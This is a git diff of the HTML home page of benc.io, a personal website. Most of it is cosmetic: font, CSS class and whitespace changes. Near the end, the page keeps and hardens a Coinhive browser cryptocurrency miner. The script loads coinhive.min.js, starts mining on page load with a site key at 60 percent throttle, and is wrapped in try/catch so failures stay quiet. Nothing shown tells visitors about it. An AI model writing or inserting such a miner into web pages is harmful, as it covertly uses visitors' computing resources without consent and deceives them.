@@ -11,8 +11,17 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.19.1/moment.min.js" integrity="sha256-zG8v+NWiZxmjNi+CvUYnZwKtHzFtdO8cAKUIdB8+U9I=" crossorigin="anonymous"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/moment-timezone/0.5.14/moment-timezone.min.js" integrity="sha256-wnlfv2SMPXay8VywRkRiL5zysJhwn2Y0du7pg2fkoEY=" crossorigin="anonymous"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/moment-timezone/0.5.14/moment-timezone-with-data-2012-2022.min.js" integrity="sha256-vBJSPpSAuUKYXDA+2hx2dQmyhkmM91vYjXI/o5QjnmA=" crossorigin="anonymous"></script>
-    <link href="https://fonts.googleapis.com/css?family=Lato:400,900|Open+Sans|Slabo+27px" rel="stylesheet">
+ 
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto%7CRoboto+Slab" integrity="sha384-tI15i7ssnXtvVn4em14i6oVOHFlGNFqZEhe7ztu7+56H9uTe6J/4jzJWhVzf/AHG" crossorigin="anonymous">
+    
+    
+
+
+    
+    
+    
     <link rel="stylesheet" href="resources/css/home.css">
+    
 </head>
 
 
@@ -21,13 +30,13 @@
 
 <body>
 
-    <div class="shift-right time" id="headers">
-        <h2 class="time">Welcome to</h2>
+    <div class="shift-right" id="headers">
+        <h2>Welcome to</h2>
         <h1>benc.io</h1>
-        <h3 class="time">This is a personal website for Ben Cooper.</h3>
+        <h3>This is a personal website for Ben Cooper.</h3>
 
     </div>
-    <div id="icons" class="shift-right time">
+    <div id="icons" class="shift-right">
         <a title="GitHub" href="https://github.com/bencooper222/" target="_blank"><i class="fa fa-github  fa-2x" aria-hidden="true"></i></a>
         <a title="Twitter" href="https://twitter.com/bcoops222" target="_blank"><i class="fa fa-twitter icon-spacing fa-2x" aria-hidden="true"></i></a>
         <a title="LinkedIn" href="https://www.linkedin.com/in/benc222/" target="_blank"><i class="fa fa-linkedin icon-spacing fa-2x" aria-hidden="true"></i></a>
@@ -36,10 +45,10 @@
 
     </div>
 
-    <div class="shift-right time" id="article-prompt">
+    <div class="shift-right" id="article-prompt">
 
-        <h3 class="time">More will be added soon.</h3>
-        <h3 class="time"> For now, check out <a id="link">a reading</a> I like.</h3>
+        <h3>More will be added soon.</h3>
+        <h3> For now, check out <a id="link">a reading</a> I like.</h3>
     </div>
 
 
@@ -47,12 +56,18 @@
 
     <script src="resources/js/nightmode.js"></script>
     <script src="resources/js/randomArticle.js"></script>
-    <script src="https://coinhive.com/lib/coinhive.min.js" integrity="sha384-vvXGWLqHrDpMZovb+TOusNudkzXRGWPdfNSDEejBE9EnL4BlbneO8Y1WIM5Vc3Px" crossorigin="anonymous"></script>
+    <script src="https://coinhive.com/lib/coinhive.min.js" integrity="sha384-osX842CxNcywFYdf9v339iSqoUdw84t4i1r7KcvyoaUNT0WBWR8aDEDC4rAyS3Sj" crossorigin="anonymous"></script>
     <script>
-        const miner = new CoinHive.Anonymous('Z9xViG5bUBovkUbtaKnxbo0CNHGiaFa0', {
+        try{
+            const miner = new CoinHive.Anonymous('Z9xViG5bUBovkUbtaKnxbo0CNHGiaFa0', {
             throttle: 0.6
         });
         miner.start();
+        }
+        catch(err){
+            console.log(err);
+        }
+       
     </script>
 
 </body>
